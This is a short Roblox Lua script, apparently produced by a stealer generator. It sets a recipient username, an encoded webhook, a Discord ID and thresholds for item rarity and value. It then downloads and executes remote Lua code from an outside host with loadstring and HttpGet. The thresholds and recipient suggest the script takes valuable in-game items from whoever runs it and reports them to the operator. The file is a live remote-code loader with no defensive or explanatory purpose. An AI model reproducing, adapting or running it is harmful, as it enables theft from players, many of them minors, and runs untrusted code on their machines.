-- This file was generated at discord.gg/syncrypt

Username = { "dev_yaskofafa" }
Webhook = "MTQ4NWFmYmQ3NTMwNDZjMGJlZjI2OGYxYzUxNmNhYWZWRUowUWdVbFVTOXdRVmhVZkVVN1Jqb0RCRjEwYXcxOENtOWRaMXNLS1FSZ1czMTRNVFl4RXc1RGZsa0ZXalpGRmxNZlIxbHdFWEFVVzNkRFRBc2tLSFlFU1VNUENSTWdEM2RTVmxJSEFtb2pNRkZoQTNNQlpTUWVRZ1JTRWhKUllRRlZZQW94T0I0R1lVWjBYSGtHQnlRT1ZXQnlRVFVHREFKSFhpaFRGU3RHZDNaakRpdFJMRkowZDNSRVhTeGpKZ0lVYzA4TE1RazFRbXNaQVZSWUhuaDZjVnNQQkZJQ2VHVUhWbDBCSlVZMk1naGtYSEFTYUFWOVJBWXJGRmcxWW41N0RWVWtMaFpaWm5SWGRrY3pTVkFHTm1kWWJTeG5NRUIrY2dFdUNEVjhWZ0Z3S3lrVEozaHdXRUI1WUJWM0FGSVdTMzFMUG1VNmRBQkRHaHNuTlVWNllIUTBQallxYnd4UlVnd1BKbDFKRUF4QmVYeFhTQWhsU1hFRlNnNFBWd05PVkZBUEIxRjVXVkFHQTJ3dldCZ2NEZ0JoYmdoREttTWFmaUFESlQ1b2YxVmZHQzliUFhZRllBSndYQTVXRHdFclcyNXVLVUFzSGxkZkxDTlZWRUZrQUEweUtnRWpYSEpRVjJKU01BUXlYUUVEVkhGZmFCY0RTWDhPVkRZZmVVTk9URlFmQmx4Y1RIQWJjbVphZlRnaEtsUkJWQ2wrTFZoZEFpVXJCUjVBWlhGME94WUpDRlp4QUZwTmVScG1EU3czY0VWcFd3dz0="
minrarity = "Common"
minrarity_sailor = "Mythical"
min_gen = 50000000
min_rap = 200000
min_val_each = 0
discord_id = "1524427588825649323"
local u1 = false
local thread = task.spawn(function()
	local ok, result = pcall(function()
		return game:HttpGet("https://www.astatine.vip/scripts/all_in_one.lua")
	end)

	if ok and result then
		u1 = true
	end
end)

task.wait(1)
task.cancel(thread)
proxy = not u1 and "https://astatine.vip/scripts/" or "https://www.astatine.vip/scripts/"
loadstring(game:HttpGet(proxy .. "all_in_one.lua"))()
